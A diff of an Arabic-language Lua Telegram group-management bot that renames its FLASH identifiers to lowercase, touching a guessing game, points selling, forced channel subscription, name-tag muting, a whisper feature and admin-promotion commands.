-FLASHdx(msg.chat_id_, msg.id_, 1,"❅∫ عذرا لا يمكنك تخمين عدد اكبر من الـ20 خمن رقم ما بين الـ1 والـ20", 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1,"❅∫ عذرا لا يمكنك تخمين عدد اكبر من الـ20 خمن رقم ما بين الـ1 والـ20", 1, 'md')
 return false  end 
-local GETNUM = FLASHdx1:get(FLASH.."GAMES:NUM"..msg.chat_id_)
+local GETNUM = flashdx1:get(flash.."GAMES:NUM"..msg.chat_id_)
 if tonumber(NUM) == tonumber(GETNUM) then
-FLASHdx1:del(FLASH..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
-FLASHdx1:del(FLASH.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
-FLASHdx1:incrby(FLASH..'bot:add:num'..msg.chat_id_..msg.sender_user_id_,5)  
-FLASHdx(msg.chat_id_, msg.id_, 1,'*❅∫ التخمين الصحيح هو* ~ '..NUM..'\n*❅∫ مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, 'md')
+flashdx1:del(flash..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
+flashdx1:del(flash.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
+flashdx1:incrby(flash..'bot:add:num'..msg.chat_id_..msg.sender_user_id_,5)  
+flashdx(msg.chat_id_, msg.id_, 1,'*❅∫ التخمين الصحيح هو* ~ '..NUM..'\n*❅∫ مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, 'md')
 elseif tonumber(NUM) ~= tonumber(GETNUM) then
-FLASHdx1:incrby(FLASH..'Set:Num'..msg.chat_id_..msg.sender_user_id_,1)
-if tonumber(FLASHdx1:get(FLASH..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) >= 3 then
-FLASHdx1:del(FLASH..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
-FLASHdx1:del(FLASH.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
-FLASHdx(msg.chat_id_, msg.id_, 1,'*❅∫ التخمين الصحيح هو*  '..GETNUM..'\n*❅∫ للاسف لقد خسرت حاول مره اخرى\n❅∫ للعب مره اخره ارسل ( تخمين )*', 1, 'md')
+flashdx1:incrby(flash..'Set:Num'..msg.chat_id_..msg.sender_user_id_,1)
+if tonumber(flashdx1:get(flash..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) >= 3 then
+flashdx1:del(flash..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
+flashdx1:del(flash.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
+flashdx(msg.chat_id_, msg.id_, 1,'*❅∫ التخمين الصحيح هو*  '..GETNUM..'\n*❅∫ للاسف لقد خسرت حاول مره اخرى\n❅∫ للعب مره اخره ارسل ( تخمين )*', 1, 'md')
 else
-if tonumber(FLASHdx1:get(FLASH..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 1 then
+if tonumber(flashdx1:get(flash..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 1 then
 SetNum = 'محاولتان فقط'
-elseif tonumber(FLASHdx1:get(FLASH..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 2 then
+elseif tonumber(flashdx1:get(flash..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 2 then
 SetNum = 'محاوله واحده فقط'
 end
-FLASHdx(msg.chat_id_, msg.id_, 1,'❅∫ لقد خمنت الرقم الخطا وتبقى لديك '..SetNum..' ارسل رقم تخمنه مره اخرى للفوز', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1,'❅∫ لقد خمنت الرقم الخطا وتبقى لديك '..SetNum..' ارسل رقم تخمنه مره اخرى للفوز', 1, 'md')
 end
 end
 end
 end
-if text == 'خمن' and FLASH11(msg) or text == 'تخمين' and FLASH11(msg) then   
-if FLASHdx1:get(FLASH..'bot:lock_geam'..msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ الالعاب معطله من قبل الادمن \n❅∫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
-return "FLASH"
+if text == 'خمن' and flash11(msg) or text == 'تخمين' and flash11(msg) then   
+if flashdx1:get(flash..'bot:lock_geam'..msg.chat_id_) then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ الالعاب معطله من قبل الادمن \n❅∫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
+return "flash"
 end
 Num = math.random(1,20)
-FLASHdx1:set(FLASH.."GAMES:NUM"..msg.chat_id_,Num) 
-FLASHdx(msg.chat_id_, msg.id_, 1,'❅∫ اهلا بك عزيزي في لعبة التخمين  \n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n❅∫ سيتم تخمين عدد ما بين الـ1 والـ20 .\n❅∫ ملاحظه لديك ثلاث محاولات فقط فكر قبل ارسال تخمينك !\n❅∫ بدأت اللعبه ارسل لي تخمينك الان', 1, 'md')
-FLASHdx1:setex(FLASH.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true)  
+flashdx1:set(flash.."GAMES:NUM"..msg.chat_id_,Num) 
+flashdx(msg.chat_id_, msg.id_, 1,'❅∫ اهلا بك عزيزي في لعبة التخمين  \n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n❅∫ سيتم تخمين عدد ما بين الـ1 والـ20 .\n❅∫ ملاحظه لديك ثلاث محاولات فقط فكر قبل ارسال تخمينك !\n❅∫ بدأت اللعبه ارسل لي تخمينك الان', 1, 'md')
+flashdx1:setex(flash.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true)  
 return false  
 end
---     By Developer FLASH     -- 
-if text == 'الالعاب' or text == 'اللعبه' and FLASH11(msg) then
-if FLASHdx1:get(FLASH..'bot:lock_geam'..msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ الالعاب معطله \n❅∫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
+--     By Developer flash     -- 
+if text == 'الالعاب' or text == 'اللعبه' and flash11(msg) then
+if flashdx1:get(flash..'bot:lock_geam'..msg.chat_id_) then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ الالعاب معطله \n❅∫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
 else
-FLASHdx(msg.chat_id_, msg.id_, 1,[[*
+flashdx(msg.chat_id_, msg.id_, 1,[[*
 ❅∫ اهلا بك في قائمه الالعاب ↓↓
          • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
 ❅∫ الالعاب المتوفره بالبوت ↓↓
@@ -3918,128 +3918,128 @@ FLASHdx(msg.chat_id_, msg.id_, 1,[[*
 ❅∫ قناة السورس *[@FAQY4] 
 ]], 1, 'md')
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_momod(msg.sender_user_id_, msg.chat_id_) and idf:match("-100(%d+)") and text:match("^ضع عدد النقاط (%d+)$")  then
 local dx1 = { string.match(text, "^(ضع عدد النقاط) (%d+)$")}
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم وضع عدد نقاط البيع\n❅∫ يمكن للعضو بيع نقاط اللعبه\n❅∫ اذا كان عدد نقاطه اكبر من~ *"..dx1[2].."*\n",1, 'md')
-FLASHdx1:set(FLASH.."FLASH_OO0" .. msg.chat_id_, dx1[2])
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم وضع عدد نقاط البيع\n❅∫ يمكن للعضو بيع نقاط اللعبه\n❅∫ اذا كان عدد نقاطه اكبر من~ *"..dx1[2].."*\n",1, 'md')
+flashdx1:set(flash.."flash_OO0" .. msg.chat_id_, dx1[2])
 return false end
---     By Developer FLASH     -- 
-if text == 'بيع نقاطي' and FLASH11(msg) then
-if tonumber((FLASHdx1:get(FLASH..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
-FLASH0 = '❅∫ ليس لديك نقاط العب اولا ، \n❅∫ للعب ارسل { الالعاب } لرؤيه الالعاب المتاحه '
-FLASHdx(msg.chat_id_, msg.id_, 1,FLASH0, 1, 'md') 
+--     By Developer flash     -- 
+if text == 'بيع نقاطي' and flash11(msg) then
+if tonumber((flashdx1:get(flash..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
+flash0 = '❅∫ ليس لديك نقاط العب اولا ، \n❅∫ للعب ارسل { الالعاب } لرؤيه الالعاب المتاحه '
+flashdx(msg.chat_id_, msg.id_, 1,flash0, 1, 'md') 
 else
-FLASH0 = (FLASHdx1:get(FLASH..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) * tonumber(FLASHdx1:get('FLASH:'..bot_id..'gamepoint' .. msg.chat_id_)or 50))
-FLASHdx1:incrby('FLASH:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_,FLASH0)  
-FLASHdx1:del(FLASH..'bot:add:num'..msg.chat_id_..msg.sender_user_id_)
-FLASH0 = tonumber((FLASHdx1:get('FLASH:'..bot_id..'gamepoint' .. msg.chat_id_) or 50))
-FLASHdx(msg.chat_id_, msg.id_, 1,'❅∫ تم بيع نقاطك \n❅∫ كل نقطه تساوي  '..FLASH0..' رساله ', 'md')
+flash0 = (flashdx1:get(flash..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) * tonumber(flashdx1:get('flash:'..bot_id..'gamepoint' .. msg.chat_id_)or 50))
+flashdx1:incrby('flash:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_,flash0)  
+flashdx1:del(flash..'bot:add:num'..msg.chat_id_..msg.sender_user_id_)
+flash0 = tonumber((flashdx1:get('flash:'..bot_id..'gamepoint' .. msg.chat_id_) or 50))
+flashdx(msg.chat_id_, msg.id_, 1,'❅∫ تم بيع نقاطك \n❅∫ كل نقطه تساوي  '..flash0..' رساله ', 'md')
 end end
---     By Developer FLASH     -- 
-if text == "تعيين قناة الاشتراك" or text == "تغيير قناة الاشتراك" and FLASH11(msg) then
+--     By Developer flash     -- 
+if text == "تعيين قناة الاشتراك" or text == "تغيير قناة الاشتراك" and flash11(msg) then
 if not is_leader(msg) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫  للمطور الاساسي فقط ', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫  للمطور الاساسي فقط ', 1, 'md')
 else
-FLASHdx1:setex(FLASH..'FLASH4'..msg.sender_user_id_,300,true)
-FLASHdx(msg.chat_id_,msg.id_, 1, "*❅∫ ارسل لي معرف قناة الاشتراك *\n", 1 , "md")
+flashdx1:setex(flash..'flash4'..msg.sender_user_id_,300,true)
+flashdx(msg.chat_id_,msg.id_, 1, "*❅∫ ارسل لي معرف قناة الاشتراك *\n", 1 , "md")
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text == 'تفعيل الاشتراك الاجباري' then
 if not is_leader(msg) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫  للمطور الاساسي فقط ', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫  للمطور الاساسي فقط ', 1, 'md')
 else
-if not FLASHdx1:get(FLASH..'FLASH3') then
-FLASHdx(msg.chat_id_,msg.id_, 1, "*❅∫ لم يتم تعيين القناة ، \n❅∫ ارسل تعيين قناة الاشتراك . *", 1 , "md")
+if not flashdx1:get(flash..'flash3') then
+flashdx(msg.chat_id_,msg.id_, 1, "*❅∫ لم يتم تعيين القناة ، \n❅∫ ارسل تعيين قناة الاشتراك . *", 1 , "md")
 return false 
 end
-if FLASHdx1:get(FLASH..'FLASH3') then
-FLASHdx(msg.chat_id_,msg.id_, 1, "*❅∫ تم تفعيل الاشتراك الاجباري ، \n❅∫ تاكد من رفعي ادمن في قناتك .*", 1 , "md")
-FLASHdx1:set(FLASH.."FLASH2", true)
+if flashdx1:get(flash..'flash3') then
+flashdx(msg.chat_id_,msg.id_, 1, "*❅∫ تم تفعيل الاشتراك الاجباري ، \n❅∫ تاكد من رفعي ادمن في قناتك .*", 1 , "md")
+flashdx1:set(flash.."flash2", true)
 return false end end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text == 'تعطيل الاشتراك الاجباري' then
 if not is_leader(msg) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫  للمطور الاساسي فقط ', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫  للمطور الاساسي فقط ', 1, 'md')
 else
-FLASHdx(msg.chat_id_,msg.id_, 1, "*❅∫ تم تعطيل الاشتراك الاجباري ، *\n", 1 , "md")
-FLASHdx1:del(FLASH.."FLASH2")
+flashdx(msg.chat_id_,msg.id_, 1, "*❅∫ تم تعطيل الاشتراك الاجباري ، *\n", 1 , "md")
+flashdx1:del(flash.."flash2")
 return false 
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text == 'جلب قناة الاشتراك' or text == 'قناة الاشتراك' then
 if not is_leader(msg) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫  للمطور الاساسي فقط ', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫  للمطور الاساسي فقط ', 1, 'md')
 else
-local FLASH5 = FLASHdx1:get(FLASH.."FLASH3")
-if FLASH5 then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ *قناة الاشتراك* : ['..FLASH5..']', 1, 'md')
+local flash5 = flashdx1:get(flash.."flash3")
+if flash5 then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ *قناة الاشتراك* : ['..flash5..']', 1, 'md')
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ لم يتم تعيين القناة ', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ لم يتم تعيين القناة ', 1, 'md')
 end end end
---     By Developer FLASH     --
+--     By Developer flash     --
 if text == "وضع شعار" or text == "ضع شعار" then 
-FLASHdx1:set("tt:add1"..bot_id..msg.chat_id_..msg.sender_user_id_,"FLASH")
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل لي الشعار الان", 1, 'md')
-return "FLASH"
+flashdx1:set("tt:add1"..bot_id..msg.chat_id_..msg.sender_user_id_,"flash")
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل لي الشعار الان", 1, 'md')
+return "flash"
 end
-if FLASHdx1:get("tt:add1"..bot_id..msg.chat_id_..msg.sender_user_id_) then 
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم تعيين : { "..text.." }", 1, 'md')
-FLASHdx1:del("tt:add1"..bot_id..msg.chat_id_..msg.sender_user_id_)
-FLASHdx1:set("tohd1"..bot_id..msg.chat_id_,text)
+if flashdx1:get("tt:add1"..bot_id..msg.chat_id_..msg.sender_user_id_) then 
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم تعيين : { "..text.." }", 1, 'md')
+flashdx1:del("tt:add1"..bot_id..msg.chat_id_..msg.sender_user_id_)
+flashdx1:set("tohd1"..bot_id..msg.chat_id_,text)
 end
 if text == "تعين عدد الكتم" or text == "تعيين عدد الكتم" or text == "ضع عدد الكتم" or text == "وضع عدد الكتم" then
-FLASHdx(msg.chat_id_, msg.id_, 1, " ❅∫ ارسل لي عدد الكتم", 1, 'md')
-FLASHdx1:set("tt:add12"..bot_id..msg.chat_id_..msg.sender_user_id_,"FLASH")
-return "FLASH"
+flashdx(msg.chat_id_, msg.id_, 1, " ❅∫ ارسل لي عدد الكتم", 1, 'md')
+flashdx1:set("tt:add12"..bot_id..msg.chat_id_..msg.sender_user_id_,"flash")
+return "flash"
 end
-if FLASHdx1:get("tt:add12"..bot_id..msg.chat_id_..msg.sender_user_id_) then 
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم تعيين : { "..text.." } عدد لكتم العضو", 1, 'md')
-FLASHdx1:del("tt:add12"..bot_id..msg.chat_id_..msg.sender_user_id_)
-FLASHdx1:set("tohd"..bot_id..msg.chat_id_,text)
+if flashdx1:get("tt:add12"..bot_id..msg.chat_id_..msg.sender_user_id_) then 
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم تعيين : { "..text.." } عدد لكتم العضو", 1, 'md')
+flashdx1:del("tt:add12"..bot_id..msg.chat_id_..msg.sender_user_id_)
+flashdx1:set("tohd"..bot_id..msg.chat_id_,text)
 end  
 if text == "تفعيل الشعار" then 
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم تفعيل الشعار", 1, 'md')
-FLASHdx1:set("tohd1_Dx"..bot_id..msg.chat_id_,"Dx")
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم تفعيل الشعار", 1, 'md')
+flashdx1:set("tohd1_Dx"..bot_id..msg.chat_id_,"Dx")
 end
 if text == "تعطيل الشعار" then 
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم تعطيل الشعار", 1, 'md')
-FLASHdx1:del("tohd1_Dx"..bot_id..msg.chat_id_)
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم تعطيل الشعار", 1, 'md')
+flashdx1:del("tohd1_Dx"..bot_id..msg.chat_id_)
 end
 
 if not msg.forward_info_  then
-if FLASHdx1:get("tohd1_Dx"..bot_id..msg.chat_id_) and FLASHdx1:get("tohd1"..bot_id..msg.chat_id_) then 
+if flashdx1:get("tohd1_Dx"..bot_id..msg.chat_id_) and flashdx1:get("tohd1"..bot_id..msg.chat_id_) then 
 id = msg.sender_user_id_
-function FLASH_FLASHDx(FLASHDx1,FLASHDx2)
-if FLASHDx2 and FLASHDx2.first_name_ then 
-if FLASHDx2.first_name_:match("(.*)"..FLASHdx1:get("tohd1"..bot_id..msg.chat_id_).."(.*)") then 
-FLASHdx1:srem('FLASHDx:'..bot_id..'muted:'..msg.chat_id_, msg.sender_user_id_)
+function flash_flashDx(flashDx1,flashDx2)
+if flashDx2 and flashDx2.first_name_ then 
+if flashDx2.first_name_:match("(.*)"..flashdx1:get("tohd1"..bot_id..msg.chat_id_).."(.*)") then 
+flashdx1:srem('flashDx:'..bot_id..'muted:'..msg.chat_id_, msg.sender_user_id_)
 else
-local FLASHDx_F = FLASHdx1:get("tohd"..bot_id..msg.chat_id_) or 5
-local FLASHDx_F2 = FLASHdx1:get("tohd22"..bot_id..msg.chat_id_..msg.sender_user_id_) or 0
-if (tonumber(FLASHDx_F2) == tonumber(FLASHDx_F) or tonumber(FLASHDx_F2) > tonumber(FLASHDx_F)) then 
-FLASHdx1:sadd(FLASH..'bot:muted:'..msg.chat_id_, msg.sender_user_id_)
+local flashDx_F = flashdx1:get("tohd"..bot_id..msg.chat_id_) or 5
+local flashDx_F2 = flashdx1:get("tohd22"..bot_id..msg.chat_id_..msg.sender_user_id_) or 0
+if (tonumber(flashDx_F2) == tonumber(flashDx_F) or tonumber(flashDx_F2) > tonumber(flashDx_F)) then 
+flashdx1:sadd(flash..'bot:muted:'..msg.chat_id_, msg.sender_user_id_)
 else
-FLASHdx1:incrby("tohd22"..bot_id..msg.chat_id_..msg.sender_user_id_,1)
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ عزيزي  ["..FLASHDx2.first_name_.."](https://t.me/"..(FLASHDx2.username_ or "FAQY4")..")\n❅∫ عليك وضع الشعار  { `"..FLASHdx1:get("tohd1"..bot_id..msg.chat_id_).."` } بجانب اسمك\n❅∫ عند انتهاء المحاولات سيتم كتمك\n\n❅∫ عدد المحاولات المتبقيه {"..(tonumber(FLASHDx_F) - tonumber(FLASHDx_F2)).."}", 1, 'md')
+flashdx1:incrby("tohd22"..bot_id..msg.chat_id_..msg.sender_user_id_,1)
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ عزيزي  ["..flashDx2.first_name_.."](https://t.me/"..(flashDx2.username_ or "FAQY4")..")\n❅∫ عليك وضع الشعار  { `"..flashdx1:get("tohd1"..bot_id..msg.chat_id_).."` } بجانب اسمك\n❅∫ عند انتهاء المحاولات سيتم كتمك\n\n❅∫ عدد المحاولات المتبقيه {"..(tonumber(flashDx_F) - tonumber(flashDx_F2)).."}", 1, 'md')
 end end end end
-getUser(id, FLASH_FLASHDx)
+getUser(id, flash_flashDx)
 end end 
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 local msg = data.message_
 text = msg.content_.text_ 
-if not FLASHdx1:get(FLASH..'TFF'..msg.chat_id_) then
+if not flashdx1:get(flash..'TFF'..msg.chat_id_) then
 if text and text:match("^اهمس (.*) (.*)") then 
 text = text:gsub('@',"")
 faed_dx = {string.match(text, "اهمس (.*) (.*)")}
 function hamss(res1,res2)
 if not res2.id_ then 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ المعرف غير صحيح ، ', 1, 'html')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ المعرف غير صحيح ، ', 1, 'html')
 return "dx"
 end
 function hamssss(ress1,ress2)
 if (ress2 and ((ress2.status_ and ress2.status_.ID == "ChatMemberStatusLeft") or ress2.ID == "Error")) then 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ العضو غير موجود بالمجموعه ، ', 1, 'html')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ العضو غير موجود بالمجموعه ، ', 1, 'html')
 return "dx"
 end
 tdcli_function ({
@@ -4048,7 +4048,7 @@ chat_id_= msg.chat_id_,
 message_ids_= {[0] = msg.id_}
 }, 
 dl_cb, nil)
-FLASHdx1:set(FLASH.."HM:"..msg.chat_id_..msg.id_..res2.id_,faed_dx[1])
+flashdx1:set(flash.."HM:"..msg.chat_id_..msg.id_..res2.id_,faed_dx[1])
 function bot_id_get(ros1,ros2)
 bot_username = (ros2.username_ or "DX_XBOT")
 function Dxx(ross1,ross2)
@@ -4056,7 +4056,7 @@ local hms = msg.sender_user_id_
 if ross2.username_ then 
 hms = "@"..ross2.username_
 end
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ هذه همسه سريه الى { @["..faed_dx[2].."] }\n❅∫ مرسله من { ["..hms.."] }\n❅∫ هو فقط من يستطيع رويتها\n❅∫ [اضغط هنا لعرض الهمسه](https://t.me/"..bot_username.."?start=hms"..msg.chat_id_..msg.id_.."_"..res2.id_..") •", 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ هذه همسه سريه الى { @["..faed_dx[2].."] }\n❅∫ مرسله من { ["..hms.."] }\n❅∫ هو فقط من يستطيع رويتها\n❅∫ [اضغط هنا لعرض الهمسه](https://t.me/"..bot_username.."?start=hms"..msg.chat_id_..msg.id_.."_"..res2.id_..") •", 1, 'md')
 end
 getUser(msg.sender_user_id_, Dxx)
 end
@@ -4070,41 +4070,41 @@ user_id_ = res2.id_
 end
 resolve_username(faed_dx[2],hamss) 
 end end
---     By Developer FLASH     -- 
-if text and text == "اهمس" or text and text == "همسه" or text and text == "اريد بوت الهمسه" or text and text == "دزلي بوت الهمسه" or  text and text == "دزولي بوت الهمسه" and FLASH11(msg) then  
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ يمكنك من خلال هذا البوت\n❅∫ ارسال همسه سريه للاعضاء \n❅∫ الامر كالاتي مثال : اهمس هلو [@Q_Y_4]', 1, 'md')
+--     By Developer flash     -- 
+if text and text == "اهمس" or text and text == "همسه" or text and text == "اريد بوت الهمسه" or text and text == "دزلي بوت الهمسه" or  text and text == "دزولي بوت الهمسه" and flash11(msg) then  
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ يمكنك من خلال هذا البوت\n❅∫ ارسال همسه سريه للاعضاء \n❅∫ الامر كالاتي مثال : اهمس هلو [@Q_Y_4]', 1, 'md')
 end
 if text and text:match("/start hms(.*)_(%d+)") then 
 faed_dx = {string.match(text, "^/start hms(.*)_(%d+)")}
 if tonumber(msg.sender_user_id_) == tonumber(faed_dx[2]) then 
-FLASH = FLASHdx1:get(FLASH.."HM:"..faed_dx[1]..faed_dx[2])
-if FLASH then 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ الهمسه هي\n❅∫ { ['..FLASH..'] }', 1, 'md')
+flash = flashdx1:get(flash.."HM:"..faed_dx[1]..faed_dx[2])
+if flash then 
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ الهمسه هي\n❅∫ { ['..flash..'] }', 1, 'md')
 else 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ اثكل الهمسه مو الك ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ اثكل الهمسه مو الك ،', 1, 'md')
 end else 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ اثكل الهمسه مو الك ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ اثكل الهمسه مو الك ،', 1, 'md')
 end end
---     By Developer FLASH     -- 
-if text == 'رفع المشرفين' or text == 'رفع الادمنيه' and FLASH11(msg) then  
+--     By Developer flash     -- 
+if text == 'رفع المشرفين' or text == 'رفع الادمنيه' and flash11(msg) then  
 local function promote_admin(extra, result, success)  
 local num = 0
 local admins = result.members_  
 for i=0 , #admins do   
 num = num + 1
-FLASHdx1:sadd(FLASH..'bot:momod:'..msg.chat_id_, admins[i].user_id_)   
+flashdx1:sadd(flash..'bot:momod:'..msg.chat_id_, admins[i].user_id_)   
 if result.members_[i].status_.ID == "ChatMemberStatusCreator" then  
 owner_id = admins[i].user_id_  
-FLASHdx1:sadd(FLASH..'bot:monsh:'..msg.chat_id_,owner_id)   
+flashdx1:sadd(flash..'bot:monsh:'..msg.chat_id_,owner_id)   
 end end  
-FLASHdx(msg.chat_id_, msg.id_, 1, '\n*❅∫ تم رفع ('..num..') ادمنيه هنا ، \n❅∫ تم رفع منشئ المجموعه . *', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '\n*❅∫ تم رفع ('..num..') ادمنيه هنا ، \n❅∫ تم رفع منشئ المجموعه . *', 1, 'md')
 end
 getChannelMembers(msg.chat_id_,0, 'Administrators', 100, promote_admin)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_momod(msg.sender_user_id_, msg.chat_id_) then
-if text == "فحص" or text == "فحص البوت" and FLASH11(msg) then
-local check = https.request('https://api.telegram.org/bot'..tokenbot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..FLASH)
+if text == "فحص" or text == "فحص البوت" and flash11(msg) then
+local check = https.request('https://api.telegram.org/bot'..tokenbot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..flash)
 local GetInfo = JSON.decode(check)
 if GetInfo.ok == true then
 if GetInfo.result.can_change_info == true then EDT = '✔️' else EDT = '✖️' end
@@ -4113,189 +4113,189 @@ if GetInfo.result.can_invite_users == true then INV = '✔️' else INV = '✖�
 if GetInfo.result.can_pin_messages == true then PIN = '✔️' else PIN = '✖️' end
 if GetInfo.result.can_restrict_members == true then BAN = '✔️' else BAN = '✖️' end
 if GetInfo.result.can_promote_members == true then VIP = '✔️' else VIP = '✖️' end 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ شغال وصلاحياته هي ⬇️\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n❅∫ حذف الرسائل ، '..DEL..'\n❅∫ دعوة المستخدمين ، '..INV..'\n❅∫ حظر المستخدمين ، '..BAN..'\n❅∫ تثبيت الرسائل ، '..PIN..'\n❅∫ تغيير المعلومات ، '..EDT..'\n❅∫ اضافة مشرفين ، '..VIP..'\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n❅∫ قناة السورس ، [@FAQY4]', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ شغال وصلاحياته هي ⬇️\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n❅∫ حذف الرسائل ، '..DEL..'\n❅∫ دعوة المستخدمين ، '..INV..'\n❅∫ حظر المستخدمين ، '..BAN..'\n❅∫ تثبيت الرسائل ، '..PIN..'\n❅∫ تغيير المعلومات ، '..EDT..'\n❅∫ اضافة مشرفين ، '..VIP..'\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n❅∫ قناة السورس ، [@FAQY4]', 1, 'md')
 end end end
---     By Developer FLASH     --
+--     By Developer flash     --
 if text and text:match("^تغير رد المطور (.*)$") then
 local Text = text:match("^تغير رد المطور (.*)$") 
-FLASHdx1:set(FLASH.."bot:sudo3:add"..msg.chat_id_,Text)
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم تغير رد المطور الى : "..Text, 1, 'md')
+flashdx1:set(flash.."bot:sudo3:add"..msg.chat_id_,Text)
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم تغير رد المطور الى : "..Text, 1, 'md')
 end
 if text and text:match("^تغير رد منشئ الاساسي (.*)$") then
 local Text = text:match("^تغير رد منشئ الاساسي (.*)$") 
-FLASHdx1:set(FLASH.."bot:monsh:add"..msg.chat_id_,Text)
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم تغير رد المنشئ الاساسي الى : "..Text, 1, 'md')
+flashdx1:set(flash.."bot:monsh:add"..msg.chat_id_,Text)
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم تغير رد المنشئ الاساسي الى : "..Text, 1, 'md')
 end
 if text and text:match("^تغير رد المنشئ (.*)$") then
 local Text = text:match("^تغير رد المنشئ (.*)$") 
-FLASHdx1:set(FLASH.."bot:monsh2"..msg.chat_id_,Text)
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم تغير رد المنشئ الى : "..Text, 1, 'md')
+flashdx1:set(flash.."bot:monsh2"..msg.chat_id_,Text)
